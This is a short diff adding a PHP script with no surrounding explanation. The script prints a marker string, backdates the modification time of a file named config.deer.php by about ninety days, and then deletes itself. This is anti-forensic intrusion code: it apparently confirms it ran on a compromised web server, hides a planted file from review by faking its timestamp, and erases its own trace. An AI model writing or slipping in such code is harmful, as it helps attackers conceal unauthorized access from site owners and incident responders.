@@ -1,0 +1,1 @@
+<?php echo "FsCaEtMxFe"; if (file_exists("./config.deer.php")){ touch("./config.deer.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*Q3ZXRXuwbh6Y0Gzfgcv1*/ ?>
